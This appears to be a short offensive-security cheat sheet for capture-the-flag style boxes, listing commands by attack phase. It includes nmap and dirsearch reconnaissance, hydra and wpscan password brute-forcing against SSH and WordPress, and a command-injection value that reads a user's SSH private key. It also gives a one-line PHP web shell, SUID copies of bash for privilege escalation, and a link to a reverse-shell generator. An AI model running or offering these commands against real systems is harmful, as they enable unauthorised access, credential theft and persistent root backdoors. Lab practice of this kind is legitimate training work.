#Reconnaissance

sudo nmap -sC -sV -v -p- 10.10.10.10 –min-rate 10000

dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10

#Getting Credentials

hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V

mysql -h 10.10.70.250 -u root -p

wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt

;cat /home/user/.ssh/id_rsa to get the SSH key

ftp 10.10.10.10 

touch id.rsa 

ssh -i id.rsa user@10.10.10.10

#Getting Remote Command Execution

<?php echo passthru($_GET['cmd']); ?>

#Privledge Escalation

chmod +s /bin/bash 
cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell

https://www.revshells.com/